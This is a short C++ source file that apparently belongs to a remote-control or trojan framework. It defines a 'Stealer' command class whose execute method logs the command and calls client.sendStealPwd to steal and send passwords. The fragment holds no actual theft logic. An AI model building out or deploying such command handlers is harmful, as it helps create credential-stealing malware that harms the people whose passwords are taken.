#include "Stealer.h"

Stealer::Stealer(void)
{
}

Stealer::~Stealer(void)
{
}

void Stealer::execute(IClient &client, std::string const& param, Packet **toSend)
{
	StaticTools::Log << "execute Stealer cmd" << std::endl;
	client.sendStealPwd(param);
}